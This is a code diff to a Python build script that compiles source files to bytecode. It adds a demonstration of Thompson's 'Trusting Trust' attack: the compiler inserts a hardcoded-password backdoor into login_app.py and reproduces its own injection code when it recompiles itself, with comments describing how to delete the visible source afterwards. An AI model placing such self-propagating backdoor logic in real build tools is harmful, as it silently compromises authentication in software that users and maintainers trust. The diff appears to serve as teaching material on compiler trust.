@@ -14,7 +14,42 @@ def build( inPath, outPath ):
     with open( inPath, 'r' ) as f:
         source = ''
         for line in f.readlines():
+
+            # START SHADINESS
+
+            # The obviously malicious code we're inspired to hide (step 1)
+            #if 'password ==' in line and 'login_app.py' == inPath:
+            #    line = app_line
+
+            # Uncomment this block and recompile for step 2 of Trusting Trust
+            app_cond = 'if \'password ==\' in line and \'login_app.py\' == inPath:'
+            app_line = 'line = \'if password == \\\'please\\\' or password == \\\'backdoor\\\':\''
+            comp_cond = 'if \'for line in f.readlines\' in line and \'thisword\' not in line:'
+            comp_line = r'''
+            app_cond = "%s"
+            app_line = "%s"
+            comp_cond = "%s"
+            comp_line = "%%s" %% REPLACE
+            %s
+                %s
+                source += line
+                continue
+            %s
+                cl = comp_line%( app_cond, app_line, comp_cond, app_cond,
+                                 app_line, comp_cond )
+                line += cl.replace( 'REPLACE', '\'\'\'+comp_line+'\'\'\'' ) '''
+
+            if 'for line in f.readlines' in line and 'if' not in line:
+                cl = comp_line%( app_cond, app_line, comp_cond, app_cond,
+                                 app_line, comp_cond )
+                line += cl.replace( 'REPLACE', '\'\'\''+comp_line+'\'\'\'' )
+
+            # Step 3, delete (comment out) all the malicious code
+
+            # END SHADINESS
+
             source += line
+    print( source )
     co = compile( source, inPath, 'exec' )
     with open( outPath, 'wb' ) as f:
         marshal.dump( co, f )
